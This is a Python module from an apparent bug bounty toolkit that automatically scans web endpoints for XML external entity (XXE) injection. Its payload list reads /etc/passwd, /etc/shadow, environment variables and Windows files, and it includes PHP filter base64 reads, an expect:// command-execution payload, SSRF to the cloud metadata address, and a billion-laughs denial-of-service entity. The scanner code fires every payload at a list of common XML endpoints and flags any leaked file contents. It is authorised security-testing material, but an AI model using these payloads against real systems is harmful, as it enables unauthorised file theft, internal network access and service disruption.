# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""XXE Injection — external entity, OOB, PHP filter, parameter entity."""

import urllib.request
import urllib.parse
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

XXE_PAYLOADS = [
    # Classic file read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
     "Classic XXE /etc/passwd", "CRITICAL"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root><data>&xxe;</data></root>',
     "Classic XXE win.ini (Windows)", "CRITICAL"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root><data>&xxe;</data></root>',
     "XXE /etc/shadow", "CRITICAL"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root><data>&xxe;</data></root>',
     "XXE /proc/self/environ", "HIGH"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><root><data>&xxe;</data></root>',
     "XXE /proc/version", "MEDIUM"),
    # PHP filter (base64 exfil)
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root><data>&xxe;</data></root>',
     "XXE PHP filter base64", "CRITICAL"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.toupper/resource=/etc/passwd">]><root><data>&xxe;</data></root>',
     "XXE PHP filter read", "HIGH"),
    # CDATA bypass
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY wrapper "<![CDATA[&xxe;]]>">]><root>&wrapper;</root>',
     "XXE CDATA bypass", "CRITICAL"),
    # expect:// RCE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root><data>&xxe;</data></root>',
     "XXE expect:// RCE", "CRITICAL"),
    # SSRFs via XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><data>&xxe;</data></root>',
     "XXE SSRF metadata", "CRITICAL"),
    # Billion laughs (DoS fingerprint)
    ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "LOL"><!ENTITY b "&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;">]><root>&c;</root>',
     "XXE Billion Laughs DoS", "HIGH"),
]

XML_ENDPOINTS = [
    "/api/xml", "/xml", "/api/upload", "/import", "/api/import",
    "/api/parse", "/soap", "/api/soap", "/wsdl", "/api/wsdl",
    "/api/data", "/api/feed", "/rss", "/atom", "/sitemap.xml",
    "/api/v1/xml", "/api/v2/xml", "/graphql",
    "/api/process", "/api/convert", "/api/transform",
    "/upload", "/file-upload", "/api/file",
]

CONTENT_TYPES = [
    "application/xml", "text/xml", "application/x-www-form-urlencoded",
    "application/soap+xml", "application/rss+xml",
]

FILE_INDICATORS = ["root:x:", "root:0:0:", "[extensions]", "[fonts]",
                   "uid=", "gid=", "/bin/bash", "www-data", "nobody",
                   "ami-id", "instance-id", "local-hostname"]

CVSS_CRIT = "9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
CVSS_HIGH = "7.5 (High)     — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS_MED  = "5.3 (Medium)   — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"


def _test_endpoint(base_url: str, path: str, timeout: int) -> list[dict]:
    findings = []
    url = base_url.rstrip("/") + path
    probe = fetch_url(url, timeout=timeout)
    if not probe or probe.get("status") not in (200, 201, 400, 404, 405, 415, 422, 500):
        return findings

    for payload, desc, sev in XXE_PAYLOADS:
        for ctype in CONTENT_TYPES[:3]:
            try:
                req = urllib.request.Request(url, data=payload.encode(), method="POST")
                req.add_header("Content-Type", ctype)
                req.add_header("Accept", "application/xml, text/xml, */*")
                req.add_header("User-Agent", "BugBountyTool/1.0")
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    body = r.read(5000).decode("utf-8", errors="replace")
                    status = r.status
                if any(ind in body for ind in FILE_INDICATORS):
                    exposed = next((ind for ind in FILE_INDICATORS if ind in body), "")
                    cvss = CVSS_CRIT if sev == "CRITICAL" else CVSS_HIGH
                    return [{
                        "type": "XXE Injection",
                        "severity": sev,
                        "url": url,
                        "payload_type": desc,
                        "content_type": ctype,
                        "cvss": cvss,
                        "description": f"XXE confirmed at {path} ({desc}): server parsed external entity — '{exposed}' visible in response.",
                        "steps_to_reproduce": (
                            f"1. POST {url}\n"
                            f"   Content-Type: {ctype}\n"
                            f"   Body: {payload[:120]}...\n"
                            f"2. Observe file content '{exposed}' in response."
                        ),
                        "impact": "File read (passwd, shadow, keys), SSRF to internal services, potential RCE via expect://.",
                        "recommendation": "Disable XML external entity processing: set FEATURE_EXTERNAL_GENERAL_ENTITIES=false. Use safe XML parsers. Consider JSON APIs.",
                    }]
                if status in (400, 500) and any(w in body.lower() for w in
                        ["entity", "dtd", "doctype", "external", "xml"]):
                    findings.append({
                        "type": "XXE — Potential Blind XXE",
                        "severity": "HIGH",
                        "url": url,
                        "payload_type": desc,
                        "cvss": CVSS_HIGH,
                        "description": f"XML endpoint {path} returned error referencing entity/DTD — blind XXE likely.",
                        "steps_to_reproduce": (
                            f"1. POST {url} with XXE payload\n"
                            "2. Observe error mentioning entity/DTD\n"
                            "3. Use Burp Collaborator/interactsh for OOB confirmation."
                        ),
                        "impact": "Blind XXE can exfiltrate files via DNS/HTTP out-of-band channels.",
                        "recommendation": "Disable DTD processing entirely. Use allowlists. Test with OOB detection tools.",
                    })
                    return findings
            except Exception:
                pass
    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 8, **kwargs) -> dict:
    findings: list[dict] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(_test_endpoint, base_url, p, timeout) for p in XML_ENDPOINTS]
        for fut in as_completed(futures):
            findings.extend(fut.result())
    return {
        "findings": findings,
        "summary": {
            "endpoints_tested": len(XML_ENDPOINTS),
            "payloads_used": len(XXE_PAYLOADS),
            "vulnerable": len(findings),
        },
    }


if __name__ == "__main__":
    pass
